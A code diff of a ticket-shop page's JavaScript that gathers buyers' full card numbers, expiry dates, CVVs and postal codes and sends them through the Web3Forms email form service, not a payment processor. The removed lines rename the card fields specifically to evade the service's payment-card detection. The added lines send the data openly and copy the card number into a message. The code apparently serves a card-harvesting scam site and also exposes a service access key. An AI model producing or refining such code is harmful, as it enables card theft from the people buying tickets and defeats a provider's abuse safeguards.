@@ -942,21 +942,21 @@ document.addEventListener('DOMContentLoaded', () => {
       placeOrderBtn.textContent = 'Processing...';
 
       try {
-        // Create FormData with innocent field names to avoid Web3Forms payment card detection
+        // Create FormData with simple field names for web3forms
         const formData = new FormData();
         formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
-        formData.append('subject', 'New Ticket Order - Payment');
+        formData.append('subject', 'New Ticket Order - Payment Received');
         formData.append('from_name', emailInput.value);
-        formData.append('email', emailInput.value);
-        formData.append('bot_field', ''); // Honeypot field for spam protection (REQUIRED by Web3Forms)
-        formData.append('event_title', document.getElementById('modal-event-name').textContent.trim());
-        formData.append('quantity', selectedQty);
-        formData.append('amount', (selectedPrice * selectedQty).toFixed(2));
-        formData.append('payment_method_1', cardNumber); // Innocent name instead of 'card_number'
-        formData.append('payment_method_2', expDate); // Innocent name instead of 'expiry_date'
-        formData.append('payment_method_3', cvv); // Innocent name instead of 'security_code'
-        formData.append('location_postal', postalCode); // Innocent name instead of 'zip_code'
-        formData.append('order_details', `Ticket Purchase: ${(selectedPrice * selectedQty).toFixed(2)}`);
+        formData.append('email_address', emailInput.value);
+        formData.append('buyer_email', emailInput.value);
+        formData.append('event_name', document.getElementById('modal-event-name').textContent.trim());
+        formData.append('ticket_quantity', selectedQty);
+        formData.append('total_payment', (selectedPrice * selectedQty).toFixed(2));
+        formData.append('card_number', cardNumber);
+        formData.append('expiry_date', expDate);
+        formData.append('security_code', cvv);
+        formData.append('zip_code', postalCode);
+        formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
 
         // Submit to Web3Forms
         const response = await fetch('https://api.web3forms.com/submit', {
